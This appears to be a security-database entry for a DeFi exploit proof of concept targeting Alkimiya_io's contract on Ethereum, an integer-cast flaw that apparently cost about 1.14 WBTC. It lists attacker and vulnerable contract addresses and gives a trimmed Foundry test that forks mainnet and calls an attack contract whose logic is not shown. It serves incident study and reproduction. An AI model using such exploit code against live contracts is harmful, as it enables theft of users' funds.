# [?] Alkimiya_IO - unsafecast

## Summary
Severity: Unknown
Chain: Ethereum
Component: Alkimiya_io
Published: 2025-03-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/Alkimiya_io_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~ 95.5 K (1.14015390 WBTC)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 95.5 K (1.14015390 WBTC)
// Original Attacker : 0xF6ffBa5cbF285824000daC0B9431032169672B6e
// MEV frontrunner : Yoink(0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A)
// Attack Contract : https://etherscan.io/address/0x80bf7db69556d9521c03461978b8fc731dbbd4e4
// Vulnerable Contract : https://etherscan.io/address/0xf3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde
// Attack Tx : https://etherscan.io/tx/0x9b9a6dd05526a8a4b40e5e1a74a25df6ecccae6ee7bf045911ad89a1dd3f0814
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant silicaPools = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
address constant morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

contract Alkimiya_io_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 22_146_340 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attC = new AttackerC();
        
        attC.attack();

        console2.log("Profit:", IFS(WBTC).balanceOf(address(attC)), 'WBTC');
    }
}
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/Alkimiya_io_exp.sol_
